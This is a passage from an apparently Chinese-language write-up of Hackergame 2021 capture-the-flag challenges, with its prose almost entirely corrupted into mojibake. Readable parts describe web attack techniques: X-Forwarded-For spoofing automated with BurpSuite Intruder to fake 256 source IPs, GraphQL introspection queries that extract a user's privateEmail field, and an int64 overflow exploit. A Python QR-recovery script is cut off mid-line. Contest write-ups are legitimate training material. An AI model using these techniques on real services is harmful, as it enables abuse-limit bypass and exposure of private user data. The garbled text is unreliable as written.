é‡Œå¾—å†™é”™å¼ƒç–—äº†ï¼›RAID0å¡åœ¨è½¯ä»¶æ²¡æœ‰æ¿€æ´»ç ä¸è®©ä¿å­˜ï¼›å’Œå„ç§å°æµ‹æ’ï¼›å„ç§ä½“è°ƒä¸è‰¯ï¼Œé¥®é£Ÿç¡çœ ä¸ä½³ï¼›æ™šä¸Šå­¦æ ¡æ–­ç”µæ²¡æ³•åšï¼Œæˆ‘åˆæ˜¯å¤§å¤œçŒ«å­â€¦â€¦å¥‡å¥‡æ€ªæ€ªæŒ¡è·¯çš„ä¸œè¥¿ä¸€ç›´ä¸å°‘ï¼Œå½’æ ¹ç»“åº•è¿˜æ˜¯å¤ªèœäº†å•¦ã€‚<br>æ€»ä¹‹éå¸¸æ„Ÿè°¢@TonyCraneå¤§ä½¬ã€GodSpeedå¤§ä½¬åŠç¾¤å†…å„æˆå‘˜çš„é¼“åŠ±æ”¯æŒå¸®åŠ©ï¼ˆè†œä¸ç®—ï¼‰ã€‚<br>å¸Œæœ›æˆ‘èƒ½æ—©æ—¥å­¦ä¼šbinaryå’Œmathã€‚  </p><hr><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>è¿™é¢˜äºŒåˆ†ä¸€ä¸‹pageå‚æ•°å³å¯ã€‚<br><del>é¼ æ ‡è¿ç‚¹å™¨</del>  </p><hr><h2 id="è¿›åˆ¶åå…­â€”â€”å‚ä¸Š"><a href="#è¿›åˆ¶åå…­â€”â€”å‚ä¸Š" class="headerlink" title="è¿›åˆ¶åå…­â€”â€”å‚ä¸Š"></a>è¿›åˆ¶åå…­â€”â€”å‚ä¸Š</h2><p>ä½¿ç”¨Hex Editor Neoç›´æ¥æ–°å»ºæ–‡ä»¶æŠ„å†™å³å¯ã€‚å½“ç„¶OCRè¯†åˆ«ä¹Ÿè¡Œå§ã€‚</p><hr><h2 id="å»å§ï¼è¿½å¯»è‡ªç”±çš„ç”µæ³¢"><a href="#å»å§ï¼è¿½å¯»è‡ªç”±çš„ç”µæ³¢" class="headerlink" title="å»å§ï¼è¿½å¯»è‡ªç”±çš„ç”µæ³¢"></a>å»å§ï¼è¿½å¯»è‡ªç”±çš„ç”µæ³¢</h2><p>ä¸‹è½½éŸ³é¢‘åå¯ä»¥å¬å‡ºæ˜¯ä¸€æ®µäººå£°ï¼Œä½†æ˜¯è¯­é€Ÿæå¿«ã€‚äºæ˜¯ä½¿ç”¨Adobe Audition CCæ‰“å¼€ï¼Œæ•ˆæœ-&gt;ä¼¸ç¼©ä¸å˜è°ƒæ”¾æ…¢é€Ÿåº¦ï¼Œé€‚å½“è°ƒèŠ‚éŸ³é«˜å°±èƒ½å¼€å§‹å¬å†™äº†ã€‚å¯ä»¥å‘ç°è¿™æ˜¯<strong>NATO Phonetic Alphabet</strong>ï¼š</p><blockquote><p>A ALPHA<br>B BRAVO<br>C CHARLIE<br>D DELTA<br>E ECHO<br>F FOXTROT<br>G GOLF<br>H HOTEL<br>I INDIA<br>J JULIET<br>K KILO<br>L LIMA<br>M MIKE<br>N NOVEMBER<br>O OSCAR<br>P PAPA<br>Q QUEBEC<br>R ROMEO<br>S SIERRA<br>T TANGO<br>U UNIFORM<br>V VICTOR<br>W WHISKEY<br>X X-RAY<br>Y YANKEE<br>Z ZULU  </p></blockquote><hr><h2 id="çŒ«å’ªé—®ç­”-Pro-Max"><a href="#çŒ«å’ªé—®ç­”-Pro-Max" class="headerlink" title="çŒ«å’ªé—®ç­” Pro Max"></a>çŒ«å’ªé—®ç­” Pro Max</h2><p>GeneralÃ— æ‚æŠ€âˆš  </p><h4 id="1-ç»å…¸WebArchive-ç¬¬ä¸€è¡Œå°±æœ‰ç­”æ¡ˆ-20150504"><a href="#1-ç»å…¸WebArchive-ç¬¬ä¸€è¡Œå°±æœ‰ç­”æ¡ˆ-20150504" class="headerlink" title="1. ç»å…¸WebArchive ç¬¬ä¸€è¡Œå°±æœ‰ç­”æ¡ˆ:20150504"></a>1. <a href="http://web.archive.org/web/20181004003308/http://sec.ustc.edu.cn/doku.php/codes">ç»å…¸WebArchive</a> ç¬¬ä¸€è¡Œå°±æœ‰ç­”æ¡ˆ:20150504</h4><h4 id="2-https-lug-ustc-edu-cn-wiki-intro"><a href="#2-https-lug-ustc-edu-cn-wiki-intro" class="headerlink" title="2. https://lug.ustc.edu.cn/wiki/intro/"></a>2. <a href="https://lug.ustc.edu.cn/wiki/intro/">https://lug.ustc.edu.cn/wiki/intro/</a></h4><blockquote><p>æ­¤å¤„èµ„æ–™æ˜¾ç¤ºæ˜¯4æ¬¡ï¼Œä½†å¹¶éæœ€æ–°ï¼Œæˆ‘åæ¥æ‰‹åŠ¨å°è¯•æ‰å¾—çŸ¥æ˜¯5</p></blockquote><h4 id="3-FTPæœåŠ¡å™¨-Obviouslyï¼Œç­”æ¡ˆæ˜¯Development-Team-of-Library-åæ¥å¾—çŸ¥ç½‘ç«™é¦–é¡µnewså¤´å›¾å°±æœ‰ï¼Œæˆ‘è¿˜æ‰¾äº†å¥½ä¹…"><a href="#3-FTPæœåŠ¡å™¨-Obviouslyï¼Œç­”æ¡ˆæ˜¯Development-Team-of-Library-åæ¥å¾—çŸ¥ç½‘ç«™é¦–é¡µnewså¤´å›¾å°±æœ‰ï¼Œæˆ‘è¿˜æ‰¾äº†å¥½ä¹…" class="headerlink" title="3. FTPæœåŠ¡å™¨ Obviouslyï¼Œç­”æ¡ˆæ˜¯Development Team of Library åæ¥å¾—çŸ¥ç½‘ç«™é¦–é¡µnewså¤´å›¾å°±æœ‰ï¼Œæˆ‘è¿˜æ‰¾äº†å¥½ä¹…"></a>3. <a href="https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2016.06.16_%E6%B4%BB%E5%8A%A8%E5%AE%A4%E6%90%AC%E8%BF%81/IMG_20160616_133655.jpg">FTPæœåŠ¡å™¨</a> Obviouslyï¼Œç­”æ¡ˆæ˜¯Development Team of Library <del>åæ¥å¾—çŸ¥ç½‘ç«™é¦–é¡µnewså¤´å›¾å°±æœ‰ï¼Œæˆ‘è¿˜æ‰¾äº†å¥½ä¹…</del></h4><h4 id="4-è°·æ­Œå…³é”®è¯SIGBOVIK2021-Newcomb-Benfordç›´æ¥å°±èƒ½æ‰¾åˆ°åŸè®ºæ–‡http-sigbovik-org-2021-proceedings-pdf-ç›´æ¥Ctrl-Fæ‰¾åˆ°æ–‡ç« ï¼Œå‘ç°æœ‰14ä¸ªFiguresï¼Œæ’é™¤ç¬¬ä¸€ä¸ªåœ¨Backgroundé‡Œçš„Figureåå¾—åˆ°ç­”æ¡ˆä¸º13"><a href="#4-è°·æ­Œå…³é”®è¯SIGBOVIK2021-Newcomb-Benfordç›´æ¥å°±èƒ½æ‰¾åˆ°åŸè®ºæ–‡http-sigbovik-org-2021-proceedings-pdf-ç›´æ¥Ctrl-Fæ‰¾åˆ°æ–‡ç« ï¼Œå‘ç°æœ‰14ä¸ªFiguresï¼Œæ’é™¤ç¬¬ä¸€ä¸ªåœ¨Backgroundé‡Œçš„Figureåå¾—åˆ°ç­”æ¡ˆä¸º13" class="headerlink" title="4. è°·æ­Œå…³é”®è¯SIGBOVIK2021 Newcomb-Benfordç›´æ¥å°±èƒ½æ‰¾åˆ°åŸè®ºæ–‡http://sigbovik.org/2021/proceedings.pdf ç›´æ¥Ctrl+Fæ‰¾åˆ°æ–‡ç« ï¼Œå‘ç°æœ‰14ä¸ªFiguresï¼Œæ’é™¤ç¬¬ä¸€ä¸ªåœ¨Backgroundé‡Œçš„Figureåå¾—åˆ°ç­”æ¡ˆä¸º13"></a>4. è°·æ­Œå…³é”®è¯<code>SIGBOVIK2021</code> <code>Newcomb-Benford</code>ç›´æ¥å°±èƒ½æ‰¾åˆ°åŸè®ºæ–‡<a href="http://sigbovik.org/2021/proceedings.pdf">http://sigbovik.org/2021/proceedings.pdf</a> ç›´æ¥<code>Ctrl+F</code>æ‰¾åˆ°æ–‡ç« ï¼Œå‘ç°æœ‰14ä¸ªFiguresï¼Œæ’é™¤ç¬¬ä¸€ä¸ªåœ¨Backgroundé‡Œçš„Figureåå¾—åˆ°ç­”æ¡ˆä¸º13</h4><h4 id="5-è°·æ­Œå…³é”®è¯protocol-report-æ‰¾åˆ°https-www-rfc-editor-org-rfc-rfc8962-html"><a href="#5-è°·æ­Œå…³é”®è¯protocol-report-æ‰¾åˆ°https-www-rfc-editor-org-rfc-rfc8962-html" class="headerlink" title="5. è°·æ­Œå…³é”®è¯protocol report æ‰¾åˆ°https://www.rfc-editor.org/rfc/rfc8962.html"></a>5. è°·æ­Œå…³é”®è¯<code>protocol</code> <code>report</code> æ‰¾åˆ°<a href="https://www.rfc-editor.org/rfc/rfc8962.html">https://www.rfc-editor.org/rfc/rfc8962.html</a></h4><blockquote><p> 6.Reporting Offenses<br>Send all your reports of possible violations and all tips about wrongdoing to <strong>&#x2F;dev&#x2F;null</strong>. The Protocol Police are listening and will take care of it.</p></blockquote><p><del>è¿˜æŒºå¹½é»˜ï¼Œä¸€å¼€å§‹è¿˜çœŸä»¥ä¸ºæœ‰policeåœ¨listening</del></p><hr><h2 id="å–ç“œ"><a href="#å–ç“œ" class="headerlink" title="å–ç“œ"></a>å–ç“œ</h2><p>20ä¸æ˜¯3çš„å€æ•°ï¼Œä¹çœ‹ä¼¼ä¹ä¸å¯èƒ½ç”¨6å’Œ9åŠ å’Œå¾—åˆ°ã€‚ä½†éšä¾¿è¯•äº†è¯•ï¼Œå‘ç°9æ–¤çš„ç“œå¾ˆå¤šå¾ˆå¤šæ—¶ä¼šæº¢å‡ºä¸º-9223372036854775808ï¼Œæ®æ­¤åˆ¤æ–­ä¸ºint64æº¢å‡ºï¼Œåˆ¤æ–­åº”å½“åœ¨æ­¤å¤„åŠ ä»¥åˆ©ç”¨ã€‚<br>æˆ‘ä»¬éœ€è¦è®©è¿™ä¸ªæ•°å­—ç¨å¾®æº¢å‡ºä¸€ç‚¹ï¼Œä¸èƒ½æº¢å‡ºå¤ªå¤šã€‚ä¹Ÿå°±æ˜¯ç•¥å¤§äºfloor(9223372036854775808&#x2F;9)ï¼Œä½¿å¾—æº¢å‡ºä¸º-9223372036854775808ä»¥å¤–çš„æ•°å­—ï¼Œå¹¶ä¸”è®©è¯¥æ•°å­—åˆ°20çš„è·ç¦»èƒ½è¢«3æ•´é™¤ã€‚ä¹‹åç›´æ¥åŠ å›20å°±è¡Œï¼ˆç®€å•å°å­¦(?)ç®—æ•°ï¼Œå±¡æœ‰å³å°†åšå‡ºæ¥æ—¶åŠ è¿‡å¤´è¶…è¿‡20çš„æƒ¨å‰§hhhï¼‰<br>çµæ„Ÿæ¥æºï¼š<a href="https://www.bbsmax.com/A/pRdByjq65n/">CTF ä¸¤é“webæ•´æ•°æº¢å‡ºé¢˜ç›®(çŒ«å’ªé“¶è¡Œå’Œltshop)</a>  </p><hr><h2 id="é€æ˜çš„æ–‡ä»¶"><a href="#é€æ˜çš„æ–‡ä»¶" class="headerlink" title="é€æ˜çš„æ–‡ä»¶"></a>é€æ˜çš„æ–‡ä»¶</h2><p>æ ¹æ®é¢˜é¢å’Œæ–‡ä»¶ä¼šå‘ç°è¿™æ˜¯ç»ˆç«¯çš„é¢œè‰²ä»£ç ï¼Œç½‘ç»œæœç´¢ç»ˆç«¯é¢œè‰²ä»£ç æ ¼å¼åå°†æ‰€æœ‰<code>[</code>å‰è¡¥ä¸Šä¸€ä¸ª<code>\e</code>ï¼Œç„¶å<code>echo -e &quot;&#123;å†…å®¹&#125;&quot;</code>å°±è¡Œå•¦ã€‚è®°å¾—æ‰§è¡Œå‰æŠŠç»ˆç«¯å…ˆç”¨å­—ç¬¦å¡«æ»¡ï¼Œä¸ç„¶å¯èƒ½ç”»ä¸å®Œæ•´ã€‚<br><img src="https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030154901529-149476643.jpg"></p><hr><h2 id="æ—…è¡Œç…§ç‰‡"><a href="#æ—…è¡Œç…§ç‰‡" class="headerlink" title="æ—…è¡Œç…§ç‰‡"></a>æ—…è¡Œç…§ç‰‡</h2><p><del>ç®€ç®€å•å•å¼€ä¸ªç›’</del><br>æ—…æ¸¸ï¼Œæµ·æ»©ï¼Œæ±‰å­—ï¼Œè¯´æ˜è¿™æ˜¯å›½å†…ä¸€ä¸ªæµ·è¾¹æ—…æ¸¸æ™¯ç‚¹ã€‚<br>è“è‰²KFCï¼Ÿè¿™å¯ä¸å¸¸è§ï¼Œåº”è¯¥æœ‰ä¸å°‘äººæ‰“å¡äº†å§ã€‚<br>ç™¾åº¦æœç´¢<code>è“è‰²KFC</code>ï¼Œç¬¬ä¸€é¡¹å°±æ˜¯æŸçº¢ä¹¦çš„<code>ç§¦çš‡å²›è’‚å‡¡å°¼è“ç§¦çš‡å²›ç½‘çº¢æ‰“å¡|å›½å†…å”¯ä¸€è’‚èŠ™å°¼è“è‰²è‚¯å¾·åŸº</code><br>ç™¾åº¦åœ°å›¾å®šä½å‘ç°è¿™å®¶åº—æ˜¯æŸæµ·åº•ä¸–ç•Œåˆ†åº—ï¼Œç›´æ¥å¾—åˆ°ç”µè¯å·ç ã€‚<br><a href="https://www.earthol.org/">https://www.earthol.org/</a>ä¸Šé€šè¿‡è¡—æ™¯å‘ç°ä¸‰ä¸ªæ±‰å­—â€œæµ·|è±š|é¦†â€<br><img src="https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030154657507-2019993326.jpg"></p><p>å¯¹ç…§åœ°å›¾ï¼Œè§†çº¿å’Œæµ·å²¸çº¿å¤§çº¦æˆ45Â°ï¼Œæ¨æµ‹åº”å½“åœ¨ä¸œå—æ–¹å‘ã€‚è¿›è€Œå‘ç°å½±å­è¥¿æ–œï¼Œåº”å½“åœ¨ä¸‹åˆ&#x2F;å‚æ™š<br>é€šè¿‡ç»˜åˆ¶å„ä¸ªæ°´å¹³çº¿æ‰¾å‡ºç­ç‚¹å¯ä»¥æ¨æµ‹æ¥¼å±‚ï¼ˆçŸ¥ä¹æœ‰äº›æ–‡ç« æœ‰è¯¦ç»†è¯´æ˜ï¼‰ã€‚æˆ‘çš„æ–¹æ³•æ˜¯æ‰¾åˆ°å¯¹é¢æ¥¼â€œæœ€çŸ©å½¢â€å˜å½¢æœ€å°‘çš„çª—æˆ·åˆ¤æ–­ä¸ºåŒä¸€æ¥¼å±‚ï¼Œç„¶åæ•°ï¼Œå‘ç°æ˜¯13å±‚å·¦å³ï¼ˆç»å°è¯•å‘ç°æ˜¯14å±‚ï¼‰</p><hr><h2 id="FLAGåŠ©åŠ›å¤§çº¢åŒ…"><a href="#FLAGåŠ©åŠ›å¤§çº¢åŒ…" class="headerlink" title="FLAGåŠ©åŠ›å¤§çº¢åŒ…"></a>FLAGåŠ©åŠ›å¤§çº¢åŒ…</h2><p>æ—¢ç„¶æ˜¯å’Œipæœ‰å…³ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„å°±æ˜¯<code>X-Forwarded-For</code>ï¼Œæœç„¶æˆåŠŸäº†ã€‚å› ä¸ºæ¯ä¸ª<code>/8</code>ipæ®µï¼ˆä¹Ÿå°±æ˜¯ä¾‹å¦‚255.0.0.0-255.255.255.255ï¼‰éƒ½åªèƒ½ç®—ä¸€æ¬¡ï¼Œæˆ‘ä»¬ä½¿ç”¨BurpSuiteçš„Intruderï¼Œå°†Postæ•°æ®ä¸­çš„ipå’Œ<code>X-Forwarded-For</code>çš„ipé¦–æ®µæ‰“ä¸Šæ ‡è®°ï¼Œé€‰æ‹©<code>Battering Ram</code>æ¨¡å¼ï¼ˆè®©ä¸¤å¤„å‚æ•°ä¸€è‡´ï¼‰ï¼Œæ„é€ 0~255çš„å­—å…¸ï¼Œè‡ªåŠ¨åŒ–è®¿é—®<code>0.114.114.114</code>ã€<code>1.114.114.114</code>ã€<code>2.114.114.114</code>â€¦â€¦<code>255.114.114.114</code>è¾¾æˆåˆšå¥½256ä¸ªåŠ©åŠ›è·å¾—flagã€‚ç”±äºæ¯æ¬¡é—´éš”2sï¼Œ2s*256&#x3D;512sï¼Œå°äºé¢˜ç›®æ—¶é•¿é™åˆ¶10min&#x3D;600sæ‰€ä»¥æ˜¯å¯è¡Œçš„ã€‚</p><hr><h2 id="Amnesia-è½»åº¦å¤±å¿†"><a href="#Amnesia-è½»åº¦å¤±å¿†" class="headerlink" title="Amnesia-è½»åº¦å¤±å¿†"></a>Amnesia-è½»åº¦å¤±å¿†</h2><p>ç›´æ¥<code>putchar()</code>é€ä¸ªæ‰“å°ç»•è¿‡å³å¯ã€‚</p><hr><h2 id="å›¾ä¹‹ä¸Šçš„ä¿¡æ¯"><a href="#å›¾ä¹‹ä¸Šçš„ä¿¡æ¯" class="headerlink" title="å›¾ä¹‹ä¸Šçš„ä¿¡æ¯"></a>å›¾ä¹‹ä¸Šçš„ä¿¡æ¯</h2><p>GraphQLçš„åˆ©ç”¨ã€‚è®¿é—®<code>/graphql?query=&#123;&#125;</code>å‘ç°å­˜åœ¨åˆ©ç”¨å¯èƒ½ã€‚æŸ¥é˜…<a href="https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ">èµ„æ–™</a>åå¾—çŸ¥å¯ä»¥åˆ©ç”¨å†…çœæ³¨å…¥ã€‚æ²¡æœ‰UIç•Œé¢æˆ‘ç›´æ¥åœ°å€æ è¾“å…¥ã€‚æ¢è¡Œæ›¿æ¢ä¸º<code>%0A</code>åï¼Œè®¿é—®<code>/graphql?query=&#123;__schema%0A&#123;types%0A&#123;name&#125;&#125;&#125;</code>å¾—åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;data&quot;:&#123;&quot;__schema&quot;:&#123;&quot;types&quot;:[&#123;&quot;name&quot;:&quot;Query&quot;&#125;,&#123;&quot;name&quot;:&quot;GNote&quot;&#125;,&#123;&quot;name&quot;:&quot;Int&quot;&#125;,&#123;&quot;name&quot;:&quot;String&quot;&#125;,&#123;&quot;name&quot;:&quot;GUser&quot;&#125;,&#123;&quot;name&quot;:&quot;Boolean&quot;&#125;,&#123;&quot;name&quot;:&quot;__Schema&quot;&#125;,&#123;&quot;name&quot;:&quot;__Type&quot;&#125;,&#123;&quot;name&quot;:&quot;__TypeKind&quot;&#125;,&#123;&quot;name&quot;:&quot;__Field&quot;&#125;,&#123;&quot;name&quot;:&quot;__InputValue&quot;&#125;,&#123;&quot;name&quot;:&quot;__EnumValue&quot;&#125;,&#123;&quot;name&quot;:&quot;__Directive&quot;&#125;,&#123;&quot;name&quot;:&quot;__DirectiveLocation&quot;&#125;]&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰ä¸ª<code>GUser</code>ç±»å‹ã€‚æ¥ä¸‹æ¥è®¿é—®<code>/graphql?query=&#123;__type(name:&quot;GUser&quot;)&#123;name%0Afields&#123;name%0Atype&#123;name,kind&#125;&#125;&#125;&#125;</code>çˆ†å‡ºå­—æ®µå<code>privateEmail</code>ï¼Œç„¶åç›´æ¥<code>/graphql?query=&#123;user(id:1)&#123;id,privateEmail&#125;&#125;</code>å¾—åˆ°flag.</p><hr><h2 id="èµ›åšå¨æˆ¿"><a href="#èµ›åšå¨æˆ¿" class="headerlink" title="èµ›åšå¨æˆ¿"></a>èµ›åšå¨æˆ¿</h2><ul><li>Level0ï¼šç›´æ¥å†™</li><li>Level1ï¼šå¤åˆ¶ç²˜è´´å‘ç°æœ‰é•¿åº¦é™åˆ¶ gotoä¼˜åŒ–è¡Œæ•°<br> ç„¶åä¸ä¼šäº†ã€‚</li></ul><hr><p>##é˜µåˆ—æ¢å¤å¤§å¸ˆ-RAID5<br>ç›´æ¥ä¸¢è¿›RAID Reconstructor 5é‡Œé¢è·‘å¾—åˆ°é•œåƒæ–‡ä»¶ã€‚Windowsä¸Šå¹¶æ²¡æ³•ç›´æ¥è¯»ï¼Œäºæ˜¯ä¸¢è¿›Diskinternals Linux Readeré‡Œè¯»æ–‡ä»¶å¯¼å‡ºã€‚æ‰§è¡Œgetflag.pyå´æç¤º<code>Did you recover my data correctly?</code>ï¼Œç–‘æƒ‘ä¹‹ä¸‹æ¢WSL(Kali Linux)æ‰§è¡Œå°±æˆåŠŸäº†ã€‚<br><del>åæ§½ï¼šRAID0çš„XFSéœ€è¦æ³¨å†Œç æ²¡æ³•æã€‚WSLä¹Ÿmountä¸ä¸Šï¼Œçœ‹æ¥è¿˜æ˜¯è™šæ‹Ÿæœºé è°±ã€‚</del></p><hr><h2 id="åŠ©è®°è¯-ç¬¬ä¸€é¡¿å¤§é¤"><a href="#åŠ©è®°è¯-ç¬¬ä¸€é¡¿å¤§é¤" class="headerlink" title="åŠ©è®°è¯-ç¬¬ä¸€é¡¿å¤§é¤"></a>åŠ©è®°è¯-ç¬¬ä¸€é¡¿å¤§é¤</h2><p>ä»£ç å®¡è®¡åå‘ç°ç›®çš„æ˜¯å»¶è¿Ÿå°½å¯èƒ½é«˜ã€‚ç”¨BurpSuiteæ”¹åŒ…åœ¨POSTæ•°æ®é‡Œå¤åˆ¶å‡ºæ¥å¾ˆå¤šè¡Œæ³¨è®°è¯æäº¤å°±æœ‰äº†flag1ã€‚å°±åƒè¿™æ ·ï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    &quot;necessary science growth addition&quot;,</span><br><span class="line">    &quot;necessary science growth addition&quot;,</span><br><span class="line">    ï¼ˆé‡å¤å¥½å¤šå¥½å¤šæ¬¡ï¼‰</span><br><span class="line">    &quot;necessary science growth addition&quot;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸è¡ŒCLEARå†è¯•è¯•ã€‚<br><img src="https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030155443141-1922071122.jpg"></p><p>å°å‘ï¼štokenè¦è·Ÿä¸Šæ‰èƒ½æ‹¿åˆ°flagï¼Œä¸è¿‡æœ‰æ—¶è‡ªåŠ¨è·å–çš„tokenæ— æ•ˆï¼Œä½¿å¾—flagåªæ˜¾ç¤ºä¸ºtrueï¼Œå› ä¸ºåŠ å·æ²¡æœ‰URLEncodeè½¬ä¹‰ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯bug.  </p><hr><h2 id="é©¬èµ›å…‹"><a href="#é©¬èµ›å…‹" class="headerlink" title="é©¬èµ›å…‹"></a>é©¬èµ›å…‹</h2><p>æ¨¡æ‹Ÿé¢˜ã€‚å¤§æ¦‚æ€è·¯æ˜¯å…ˆæ‰«ä¸€éï¼ŒæŠŠèƒ½ç¡®å®šçš„å…ˆç¡®å®šä¸‹æ¥ã€‚ä¹‹åå†dfså‰©ä¸‹çš„å—ï¼ˆä¸éœ€è¦å…¨éƒ¨æ±‚å‡ºï¼Œæ¯•ç«Ÿè¿™é¢˜çš„äºŒç»´ç çº é”™æ‹‰æ»¡äº†ï¼‰ã€‚<br>ä»£ç å¾ˆä¸‘å¯¹å§QAQï¼ˆå½“æ—¶ä¸ç†Ÿæ‚‰ndarrayæ“ä½œï¼Œå…¨éƒ¨å½“åšliståšä¸€éï¼‰  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="comment"># import scipy</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">SIZE = <span class="number">627</span></span><br><span class="line">MSBLOCK = <span class="number">23</span></span><br><span class="line">QRBLOCK = <span class="number">11</span></span><br><span class="line">X, Y = <span class="number">103</span>, <span class="number">137</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ImageToMatrix</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="comment"># è¯»å–å›¾ç‰‡</span></span><br><span class="line">    im = Image.<span class="built_in">open</span>(filename)</span><br><span class="line">    <span class="comment"># æ˜¾ç¤ºå›¾ç‰‡</span></span><br><span class="line"><span class="comment">#     im.show()  </span></span><br><span class="line">    width,height = im.size</span><br><span class="line">    im = im.convert(<span class="string">&quot;L&quot;</span>) </span><br><span class="line">    data = im.getdata()</span><br><span class="line">    data = np.matrix(data,dtype=<span class="string">&#x27;float&#x27;</span>)/<span class="number">255.0</span></span><br><span class="line">    new_data = np.reshape(data,(width,height))</span><br><span class="line">    <span class="keyword">return</span> new_data</span><br><span class="line"><span class="comment">#     new_im = Image.fromarray(new_data)</span></span><br><span class="line"><span class="comment">#     # æ˜¾ç¤ºå›¾ç‰‡</span></span><br><span class="line"><span class="comment">#     new_im.show()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MatrixToImage</span>(<span class="params">data</span>):</span><br><span class="line">    data = data*<span class="number">255</span></span><br><span class="line">    new_im = Image.fromarray(data.astype(np.uint8))</span><br><span class="line">    <span class="keyword">return</span> new_im</span><br><span class="line">    </span><br><span class="line">pre_arr =  [[<span class="number">0</span> <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(SIZE)] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(SIZE)]</span><br><span class="line">res_arr =  [[<span class="number">1</span> <span class="keyword">for</span> col <span class="keyword">in</span> <span 